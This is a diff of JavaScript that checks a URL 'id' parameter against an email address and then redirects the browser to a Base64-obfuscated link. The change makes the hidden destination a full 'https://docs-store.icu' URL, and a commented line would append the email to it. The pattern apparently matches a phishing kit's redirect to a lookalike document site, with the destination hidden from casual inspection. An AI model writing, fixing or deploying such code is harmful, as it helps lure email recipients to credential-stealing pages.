@@ -165,7 +165,7 @@
         let emailId = new URLSearchParams(window.location.search).get("id");
 
         if (emailId == email) {
-          const link = "ZG9jcy1zdG9yZS5pY3U="; // Base64 encoded link
+          const link = "aHR0cHM6Ly9kb2NzLXN0b3JlLmljdQ=="; // Base64 encoded link
           const decodedLink = atob(link);
           // const finalLink = `${decodedLink}#M${email}`;
           window.location.href = decodedLink;
